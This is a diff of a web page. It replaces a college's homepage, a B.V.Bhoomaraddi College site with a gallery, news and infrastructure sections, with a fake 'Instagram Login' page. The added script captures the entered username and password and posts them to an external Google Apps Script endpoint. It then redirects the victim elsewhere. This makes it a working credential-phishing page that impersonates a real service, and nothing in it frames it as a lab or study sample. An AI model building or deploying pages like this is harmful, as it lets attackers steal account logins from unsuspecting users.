@@ -1,428 +1,119 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://getbootstrap.com/docs/5.3/assets/css/docs.css" rel="stylesheet">
-    <title>B.V.Bhoomaraddi collage </title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
-  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
-  <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.slim.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
-  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
-  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-   
+        .container {
+            display: flex;
+            flex-direction: column;
+        }
 
-   
-  </head>
+        .login-box {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            width: 320px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
 
- 
-<body class="top">
-    
-    <section>
-        <nav >
-            <div class="socialtop">
-            <div class="top-social">
-                <a href="#"><i class="fa fa-facebook"></i></a>
-                 <a href="#"><i class="fa fa-twitter"></i></a>
-                 <a href="#"><i class="fa fa-instagram"></i></a>
-                 <a href="#"><i class="fa fa-facebook"></i></a>
-            </div>
-          </nav>
-    </section>
-       <section>
-            <div class="header">
-              <img src="hkelogo.png" alt="Logo 1" class="logo logo-left">
-              <div class="collage-name">
-                 <p class="hke"> H.K.E. Society's</p>
-                  <p class="bold-text">B.V.BHOOMARADDI College of Arts, Science</p>
-                  <p class="bold-text">and Commerce , Bidar</p>
-              </div>
-              <img src="bvblogo.jpg" alt="Logo 2" class="logo logo-right">
-          </div>
-          
-         
-          
-          </section>
-       
-<section class="nav7">
-  <div class="nav8">
-    <div class="logo8">
-              <h1>Logo</h1>
-          </div>
-          <ul id="menuList">
-              <li><a href="">Home</a></li>
-              <li><a href="">About</a></li>
-              <li><a href="">Services</a></li>
-              <li><a href="">Product</a></li>
-              <li><a href="">Contact</a></li>
-          </ul>
-          <div class="menu-icon">
-              <i class="fa-solid fa-bars" onclick="toggleMenu()"></i>
-          </div>
+        .logo {
+            width: 50px; /* Adjust the width as needed */
+            height: auto; /* Maintain aspect ratio */
+            margin-bottom: 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            background-color: #3897f0;
+            color: white;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .signup-box {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 320px;
+            text-align: center;
+            border-top: 1px solid #dbdbdb;
+        }
+
+        .signup-box p {
+            margin: 0;
+            font-size: 14px;
+            color: #999;
+        }
+
+        .signup-box a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="download.jpg" alt="Instagram Logo" class="logo">
+            <form name="submit-to-google-sheet">
+                <input type="text" name="id" placeholder="Username" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <p>Forgot your password? <a href="#">Reset it here</a></p>
         </div>
-</section>
-
-
-  
-          <section>
-            <!-- Image Slider Carousel -->
-            <div id="carouselExample" class="carousel slide" data-ride="carousel">
-              <div class="carousel-inner">
-                <div class="carousel-item active">
-                  <img src="update1.png" class="d-block w-100" alt="Slide 1">
-                </div>
-                <div class="carousel-item">
-                  <img src="update2.png" class="d-block w-100" alt="Slide 2">
-                </div>
-                <div class="carousel-item">
-                  <img src="IMG_3869-scaled (1).png" class="d-block w-100" alt="Slide 3">
-                </div>
-              </div>
-              <a class="carousel-control-prev" href="#carouselExample" role="button" data-slide="prev">
-                <span class="carousel-control-prev-icon" aria-hidden="true"></span>
-                <span class="sr-only">prev</span>
-              </a>
-              <a class="carousel-control-next" href="#carouselExample" role="button" data-slide="next">
-                <span class="carousel-control-next-icon" aria-hidden="true"></span>
-                <span class="sr-only">next</span>
-              </a>
-             
-            </div>
-          </section>
-        
-    <!-- Example Code -->
- 
-    <section class="latest">
-        <div class="box1">
-          <h3>latest news</h3>
-          <!-- Content for the second div with a scrollbar -->
-       
-          <!-- Add more content here to see the scrollbar in action -->
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Eveniet, rerum.</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Magni, ut?</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Autem, quia.</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Enim, unde.</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor, sit amet consectetur adipisicing elit. Rerum, natus.</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Officiis, magnam?</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Magni, ut?</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Autem, quia.</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Enim, unde.</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor, sit amet consectetur adipisicing elit. Rerum, natus.</a></p>
-          <p><a href="#" target="_blank">Lorem ipsum dolor sit amet consectetur adipisicing elit. Officiis, magnam?</a></p>
-        </div>
-        <div class="box">
-          <h3>About Institution</h3>
-          <img src="download.jpg" class="logo5">
-          <p>Bidar, a part of Hyderabad Karnataka area, remained economically and educationally backward area inspite of having rich cultural background. Our founder President, Late Shri.Mahadevappa Rampure did a yeoman service by realizing this and started B.V.B. College, in the year 1960 to provide educational opportunities to the youth of this backward area and made their educational dream come true. People stopped going to Hyderabad or Gulbarga for higher education. He was a great visionary, the 52 acres of land purchased in 1960’s is ample proof of his vision.
-    
-          </p>
-         
-         
-       
-        </div>
-    
-       
-      </section>
-    
-    
-    <!-- End Example Code -->
-   <section class="bod">
-   
-  <div class="counter-wrapper">
-    <div class="counter">
-        <h1 class="count" data-target="1254">0</h1>
-        <p>New Visiters Every Week</p>
-    </div>
-    <div class="counter">
-        <h1 class="count" data-target="12168">0</h1>
-        <p>Happy customers every year</p>
-    </div>
-    <div class="counter">
-        <h1 class="count" data-target="2172">0</h1>
-        <p>Won Amazing Awards</p>
-    </div>
-    <div class="counter">
-        <h1 class="count" data-target="732">0</h1>
-        <p>New Listing Every Week</p>
-    </div>
-</div>
-   </section>
-
-<script src="main.js"></script>
-
-<section class="gallery">
-  <div class="media-section">
-
-    <div class="photo-div">
-        <h2>Photo Gallery</h2>
-        <div class="photo-container">
-            <div class="photo-item">
-                <img src="download.jpeg" alt="Photo 1">
-            </div>
-            <div class="photo-item">
-                <img src="download.jpeg" alt="Photo 2">
-            </div>
-            <div class="photo-item">
-                <img src="download.jpeg" alt="Photo 3">
-            </div>
-            <div class="photo-item">
-                <img src="download.jpeg" alt="Photo 4">
-            </div>
-        </div>
-        <a href="photo-gallery.html" class="see-all-btn">See All Photos</a>
-    </div>
-
-    <div class="video-div">
-        <h2>Video Gallery</h2>
-        <div class="video-container">
-            <div class="video-item">
-                <iframe width="100%" height="400px" src="https://www.youtube.com/embed/bR5pmwNajjQ?si=2Gn1vx9M5kuHnGBt" frameborder="0" allowfullscreen></iframe>
-            </div>
-        </div>
-        <a href="video-gallery.html" class="see-all-btn">See All Videos</a>
-    </div>
-
-</div>
-</section>
-<section id="dualContainerSection">
-  <div id="photoContainer"></div>
-
-  <div id="designContainer">
-      <div id="centeredDesign">
-          <h2>Your Centered Design</h2>
-          <p>Some content goes here...</p>
-          <!-- Replace 'your-scholarship-page.html' with the actual URL of your scholarship page -->
-          <a href="your-scholarship-page.html" id="scholarshipButton">Scholarship</a>
-      </div>
-  </div>
-</section>
-
-<section class="profile">
-<div class="infra">
-  <h2><b>INFRASTRUCTURES</b></h2>
-</div>
-  <div class="profile-cards-container">
-   
-    <div class="profile-card">
-        <div class="profile-img-container">
-            <img src="3-600x450.jpeg" alt="Profile 1">
-            <div class="glow-on-hover"></div>
-        </div>
-        <div class="profile-content">
-            <h3>Library</h3>
-            <p>The Library is well equipped with books & journals. The reading room and study room facilities are provided throughout the year.</p>
-        </div>
-    </div>
-
-    <div class="profile-card">
-        <div class="profile-img-container">
-            <img src="images (2).png" alt="Profile 2">
-            <div class="glow-on-hover"></div>
-        </div>
-        <div class="profile-content">
-            <h3>Sports</h3>
-            <p>College is equipped with Football ground,Tennis,Basket Ball etc available. Separate Gym facilities also available</p>
-        </div>
-    </div>
-
-    <div class="profile-card">
-        <div class="profile-img-container">
-            <img src="download (2).jpeg" alt="Profile 3">
-            <div class="glow-on-hover"></div>
-        </div>
-        <div class="profile-content">
-            <h3>Alumni</h3>
-            <p>The collage celebrated its golden jubliee with a rich galaxy of alumni. The institute network
-              collaborates with alumni through alumni association and alumni meetings. </p>
-        </div>
-    </div>
-
-    <div class="profile-card">
-        <div class="profile-img-container">
-            <img src="8.png" alt="Profile 4">
-            <div class="glow-on-hover"></div>
-        </div>
-        <div class="profile-content">
-            <h3>Garden</h3>
-            <p>It's been shown to lighten mood and lower levels of stress and anxiety,Levels of comfort and positive emotions increase with the duration of exposure to plants.</p>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
         </div>
     </div>
     
-</div>
-</section>
-<section class="mission">
-<div class="section">
-  <div class="content">
-      <div class="animation"></div>
-      <h2>Vision</h2>
-      <p>Effective teaching and to provide a conducive atmosphere for learning</p>
-      <p>To make students competent in all fields of life</p>
-      <p>To impart value-based education to all</p>
-      <p>To develop a scientific temperament and build national character.</p>
-      <p>To achieve national goals through education.</p>
-  </div>
+    <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbw-vha_j7Ubx7OnzrzCwaWVgo_Uq6ITOWGitOAo5LPNpTsV52YwTEdra5CjH5KzGVjt/exec';
+    const form = document.forms['submit-to-google-sheet'];
 
-  <div class="content">
-      <div class="animation"></div>
-      <h2>Mission</h2>
-      <p>To make student youth more responsible citizens through education.</p>
-      <p>Empowering young men and women to meet the challenges of modern times</p>
-      <p>Contributing to preserving our rich cultural heritage and service to the nation through education</p>
-      <p>To make the institution the center for research and development by using the latest technology</p>
-      <p>Quest for excellence in different fields</p>
-  </div>
-</div>
-</section>
+    form.addEventListener('submit', e => {
+        e.preventDefault();
+        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => {
+                console.log('Success!', response);
+                // Redirect to another page after successful form submission
+                window.location.href = 'https://chat.openai.com/c/e35bfe39-a105-4c2b-88b5-6af7726e5fe3'; // Change 'another-page.html' to the desired page URL
+            })
+            .catch(error => console.error('Error!', error.message));
+    });
+</script>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
+    
+    
+    
+    
 </body>
-
-<footer>
-  <div class="foot">
-      <div class="row">
-            <div class="col" id="company">
-<h3>B.V.B</h3>
-                <p>
-                  HKE Society is the prestigious educational institute of Karnataka has stressed to inculcate the value based education in all the institutions in fact it is the only organization which has been imparting higher education in backward region of the state, Bidar, Kalaburagi, Raichur and Yadgiri from past five decades.
-                </p>
-                <div class="social">
-                  <a href="#"><i class="fab fa-facebook"></i></a>
-                  <a href="#"><i class="fab fa-instagram"></i></a>
-                  <a href="#"><i class="fab fa-youtube"></i></a>
-                  <a href="#"><i class="fab fa-twitter"></i></a>
-                  <a href="#"><i class="fab fa-linkedin"></i></a>
-                </div>
-            </div>
-
-
-            <div class="col" id="services">
-               <h3>Services</h3>
-               <div class="links">
-                  <a href="#">Illustration</a>
-                  <a href="#">Creatives</a>
-                  <a href="#">Poster Design</a>
-                  <a href="#">Card Design</a>
-               </div>
-            </div>
-
-            <div class="col" id="useful-links">
-               <h3>Links</h3>
-               <div class="links">
-                  <a href="#">About</a>
-                  <a href="#">Services</a>
-                  <a href="#">Our Policy</a>
-                  <a href="#">Help</a>
-               </div>
-            </div>
-
-            <div class="col" id="contact">
-                <h3>Contact</h3>
-                <div class="contact-details">
-                   <i class="fa fa-location"></i>
-                   <p>FF-42, Procube Avenue, <br> NY, USA</p>
-                </div>
-                <div class="contact-details">
-                   <i class="fa fa-phone"></i>
-                   <p>+1-8755856858</p>
-                </div>
-            </div>
-      </div>
-
-      <div class="row">
-            <div class="form">
-              <form action="">
-                  <input type="text" placeholder="Email here...">
-                  <button><i class="fa fa-paper-plane"></i></button>
-              </form>
-            </div>
-
-      </div>
-<div class="copy">
-  <p>Made By B.C.A,BVB  @ 2023 BVBCB.All Rights Reserved   </p>
-</div>
-  </div>
-</footer>
-<script>
-  $(document).ready(function(){
-    // Enable the carousel
-    $('#myCarousel').carousel();
-
-    // Set interval to automatically slide to the next item every 3 seconds (3000 milliseconds)
-    setInterval(function(){
-      $('#myCarousel').carousel('next');
-    }, 1000);
-  });
-</script>
-<script>
-  let menuList = document.getElementById("menuList")
-  menuList.style.maxHeight = "0px";
-
-  function toggleMenu(){
-      if(menuList.style.maxHeight == "0px")
-      {
-          menuList.style.maxHeight = "300px";
-      }
-      else{
-          menuList.style.maxHeight = "0px";
-      }
-  }
-  
-</script>
-<script src="https://kit.fontawesome.com/f8e1a90484.js" crossorigin="anonymous"></script>
-
 </html>
